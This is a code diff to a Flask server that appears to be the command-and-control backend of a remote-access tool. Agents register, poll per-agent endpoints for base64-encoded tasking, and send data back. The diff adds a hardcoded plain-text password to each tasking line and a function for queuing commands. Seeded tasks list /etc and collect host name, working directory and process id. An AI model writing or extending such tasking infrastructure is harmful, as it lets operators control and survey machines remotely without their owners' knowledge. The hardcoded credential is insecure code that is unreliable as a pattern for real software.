@@ -18,8 +18,9 @@ def register_agent(uname, uid):
 	global agent_db
 	base = {
 		"uname": uname,
-		"commands": [],
-		"poll": "active"
+		"commands": {},
+		"poll": "active",
+		"password": "password"
 	}
 	if uid not in agent_db:
 		agent_db[uid] = base
@@ -29,27 +30,10 @@ def register_agent(uname, uid):
 
 @app.post("/register")
 def register():
-	data = str(base64.urlsafe_b64decode(bytes(request.data)), 'utf-8').split(":")
+	data = str(base64.urlsafe_b64decode(bytes(request.data)), 'utf-8').split("::")
 	register_agent(data[0], data[1])
 	return "", 200
 
-
-# @app.get("/commands")
-# def serve_commands():
-# 	"""
-# 	TODO: remove
-# 	Returns:
-
-# 	"""
-# 	if active == "active":
-# 		page = "active\n"
-# 	else:
-# 		page = "passive\n"
-# 	for cmd in cmds:
-# 		hashed = hashlib.sha256(cmd.encode("utf-8")).hexdigest()
-# 		page += f"{cmd}:{hashed}\n"
-# 	page = base64.urlsafe_b64encode(bytes(page.encode('utf-8')))
-# 	return page
 
 
 @app.get("/<pid>/commands")
@@ -57,9 +41,10 @@ def serve_commands(pid):
 	global agent_db
 	print(agent_db)
 	commands = agent_db[pid]["poll"]
-	for cmd in agent_db[pid]["commands"]:
+	password = agent_db[pid]["password"]
+	for cmd in agent_db[pid]["commands"].keys():
 		hashed = hashlib.sha256(cmd.encode("utf-8")).hexdigest()
-		commands += f"{cmd}:{hashed}\n"
+		commands += f"{password}:{cmd}:{hashed}\n"
 	return base64.urlsafe_b64encode(bytes(commands.encode('utf-8')))
 
 
@@ -70,10 +55,16 @@ def receive_data():
 	return "", 200
 
 
+def add_commands(command, uid):
+	global agent_db
+
+	agent_db[uid]["commands"][command] = "!EMPTY!"
+
+
 if __name__ == "__main__":
-	cmds.append("password:ls:/etc")
-	cmds.append("password:BUILTIN:name")
-	cmds.append("password:BUILTIN:cwd")
-	cmds.append("password:BUILTIN:pid")
+	cmds.append("ls:/etc")
+	cmds.append("BUILTIN:name")
+	cmds.append("BUILTIN:cwd")
+	cmds.append("BUILTIN:pid")
 
 	app.run(host="localhost", port=PORT, debug=True)
